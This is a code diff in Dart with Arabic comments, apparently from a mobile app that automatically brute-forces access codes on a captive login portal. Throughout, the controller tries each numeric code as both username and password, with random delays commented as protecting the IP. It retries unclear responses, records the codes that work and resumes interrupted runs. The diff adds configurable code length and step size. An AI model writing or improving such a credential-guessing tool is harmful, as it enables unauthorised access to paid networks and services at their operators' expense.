@@ -47,8 +47,6 @@ class AutoPortalController extends ChangeNotifier {
   final DetectFn _detectFn;
   final DelayPickFn _delayPickFn;
   bool _disposed = false;
-  bool _startedOnce = false;
-  bool _hasRestoredSession = false;
 
   // ------------------------------------------------------------ الحالة
   /// هل المحرّك يعمل (مراقبة + محاولات)؟
@@ -106,8 +104,37 @@ class AutoPortalController extends ChangeNotifier {
   bool? manualSuccess;
 
   // --------------------------------------------------------- مساعدات ثابتة
-  /// تنسيق الرقم بعشرة خانات بأصفار يسارية.
-  static String formatCode(int value) => value.toString().padLeft(10, '0');
+  /// تنسيق الرقم بطول محدد بأصفار يسارية (الافتراضي 10).
+  static String formatCode(int value, [int length = 10]) =>
+      value.toString().padLeft(length, '0');
+
+  /// الحد الأدنى لعدد الخانات.
+  static const int minLength = 4;
+
+  /// الحد الأقصى لعدد الخانات.
+  static const int maxLength = 12;
+
+  /// عدد خانات التوليد (اختياري — الافتراضي 10).
+  int codeLength = 10;
+
+  /// قيمة الزيادة بين كل رمز وآخر (اختياري — الافتراضي 1).
+  /// مثال: بداية 511 وزيادة 100 ⇒ 0000000511 → 0000000611 → 0000000711.
+  int step = 1;
+
+  /// تحديث قيمة الزيادة (غير صالح/صفر/سالب ⇒ 1).
+  void setStep(String raw) {
+    if (running || monitoring) return;
+    final int? value = int.tryParse(raw.trim());
+    step = (value == null || value < 1) ? 1 : value;
+    notifyListeners();
+  }
+
+  /// ضبط عدد الخانات (مقيّد بين 4 و12) — لا يتغير أثناء العمل.
+  void setCodeLength(int value) {
+    if (running || monitoring) return;
+    codeLength = value.clamp(minLength, maxLength).toInt();
+    notifyListeners();
+  }
 
   /// تحليل رقم البداية: فارغ/غير صالح ⇒ 1.
   static int parseStart(String raw) {
@@ -124,15 +151,23 @@ class AutoPortalController extends ChangeNotifier {
   /// تأخير افتراضي عشوائي 500-1000 مللي ثانية (حماية الاتصال وIP).
   static int _defaultDelay() => 500 + Random().nextInt(501);
 
-  /// محاولة حقيقية عبر PortalClient: الرمز اسم مستخدم وكلمة مرور معاً.
+  /// محاولة حقيقية عبر PortalClient — الرمز اسم مستخدم وكلمة مرور معاً —
+  /// مع إعادة المحاولة عند «لا استجابة» (الشبكة تراوغ) حتى 3 مرات.
   static Future<bool> _defaultAttempt(String portalUrl, String code) async {
-    final LoginOutcome outcome = await const PortalClient().attempt(
-      baseUrl: portalUrl,
-      username: code,
-      password: code,
-      destination: '',
-    );
-    return outcome.success;
+    const PortalClient client = PortalClient();
+    for (int tryIndex = 0; tryIndex < 3; tryIndex++) {
+      final LoginOutcome outcome = await client.attempt(
+        baseUrl: portalUrl,
+        username: code,
+        password: code,
+        destination: '',
+      );
+      if (!outcome.inconclusive) {
+        return outcome.success;
+      }
+      await Future<void>.delayed(const Duration(milliseconds: 800));
+    }
+    return false;
   }
 
   // ------------------------------------------------------------ الإدخال
@@ -245,11 +280,10 @@ class AutoPortalController extends ChangeNotifier {
     paused = false;
     smartPaused = false;
     error = null;
-    if (!_startedOnce && !_hasRestoredSession) {
-      currentNumber = parseStart(startInput);
-    }
-    _startedOnce = true;
-    statusText = 'بدأ الوضع التلقائي — كشف واتصال';
+    // يبدأ دائماً من الرقم المكتوب في الخانة ويصعد تصاعدياً (الفارغ = 1،
+    // والاستعادة تعيد ملء الخانة بنقطة التوقف تلقائياً).
+    currentNumber = parseStart(startInput);
+    statusText = 'بدأ الوضع التلقائي من ${formatCode(currentNumber, codeLength)}';
     notifyListeners();
     unawaited(_engineLoop());
   }
@@ -267,7 +301,7 @@ class AutoPortalController extends ChangeNotifier {
     if (!monitoring || _disposed) return;
     if (smartPaused) {
       // نكمل البحث عن بقية الرموز: نتجاوز الرمز المكتشف.
-      currentNumber++;
+      currentNumber += step;
       lastFound = null;
       unawaited(_persist());
     }
@@ -285,7 +319,7 @@ class AutoPortalController extends ChangeNotifier {
     smartPaused = false;
     paused = false;
     lastFound = null;
-    statusText = 'أُعيد الضبط — يبدأ من ${formatCode(currentNumber)}';
+    statusText = 'أُعيد الضبط — يبدأ من ${formatCode(currentNumber, codeLength)}';
     await _persist();
     notifyListeners();
   }
@@ -336,7 +370,7 @@ class AutoPortalController extends ChangeNotifier {
       }
 
       // محاولة حقيقية واحدة بالرمز الحالي.
-      final String code = formatCode(currentNumber);
+      final String code = formatCode(currentNumber, codeLength);
       statusText = 'جارٍ فحص $code...';
       notifyListeners();
 
@@ -362,8 +396,8 @@ class AutoPortalController extends ChangeNotifier {
         continue;
       }
 
-      // فشل: حفظ آخر رقم، انتقال للتالي، مهلة حماية 500-1000ms.
-      currentNumber++;
+      // فشل: حفظ آخر رقم، الانتقال بقيمة الزيادة، مهلة حماية 500-1000ms.
+      currentNumber += step;
       await _persist();
       statusText = 'فُحص $code — الانتقال للتالي';
       notifyListeners();
@@ -380,11 +414,18 @@ class AutoPortalController extends ChangeNotifier {
       if (_disposed) return;
       if (state.lastNumber > 0) {
         currentNumber = state.lastNumber;
-        _hasRestoredSession = true;
-        statusText = 'استُعيدت الجلسة — آخر رقم ${formatCode(state.lastNumber)}';
+        // الخانة تعرض نقطة الاستئناف — «بدء تلقائي» يكمل منها.
+        startInput = state.lastNumber.toString();
+        statusText = 'استُعيدت الجلسة — آخر رقم ${formatCode(state.lastNumber, codeLength)}';
       }
       if (state.portalUrl.isNotEmpty) portalUrl = state.portalUrl;
       if (state.foundCodes.isNotEmpty) foundCodes = state.foundCodes;
+      if (state.codeLength >= minLength && state.codeLength <= maxLength) {
+        codeLength = state.codeLength;
+      }
+      if (state.step >= 1) {
+        step = state.step;
+      }
       notifyListeners();
     } catch (_) {
       // بلا جلسة سابقة — بداية نظيفة.
@@ -397,6 +438,8 @@ class AutoPortalController extends ChangeNotifier {
         lastNumber: currentNumber,
         portalUrl: portalUrl.trim(),
         foundCodes: foundCodes,
+        codeLength: codeLength,
+        step: step,
       ));
     } catch (_) {
       // فشل الحفظ لا يعطل المحرك.
